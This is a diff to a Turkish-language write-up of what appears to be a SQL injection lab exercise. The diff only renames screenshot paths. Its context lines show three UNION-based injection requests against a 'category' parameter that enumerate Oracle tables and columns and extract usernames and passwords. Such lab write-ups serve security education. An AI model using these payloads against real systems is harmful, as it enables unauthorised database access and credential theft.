@@ -24,7 +24,7 @@ Uygulama `category` parametresini doğrulamadan SQL sorgusuna ekliyor. Bu sayede
 GET /filter?category=' UNION SELECT table_name,null FROM all_tables-- HTTP/2
 ```
 
-![Tablo isimleri listeleniyor](images/question5_1.png)
+![Tablo isimleri listeleniyor](images/lab6_1.png)
 
 - Bir tablo için sütunları listelemek için:
 
@@ -32,7 +32,7 @@ GET /filter?category=' UNION SELECT table_name,null FROM all_tables-- HTTP/2
 GET /filter?category=' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_BJAPLX'-- HTTP/2
 ```
 
-![Sütun isimleri listeleniyor](images/question5_2.png)
+![Sütun isimleri listeleniyor](images/lab6_2.png)
 
 - Kullanıcı bilgilerini çıkarmak için:
 
@@ -40,7 +40,7 @@ GET /filter?category=' UNION SELECT column_name,null FROM all_tab_columns WHERE 
 GET /filter?category=' UNION SELECT USERNAME_REWXWI,PASSWORD_XYTSRS FROM USERS_BJAPLX-- HTTP/2
 ```
 
-![Kullanıcı verileri döndürülüyor](images/question5_3.png)
+![Kullanıcı verileri döndürülüyor](images/lab6_3.png)
 
 ## 5. Sonuç
 
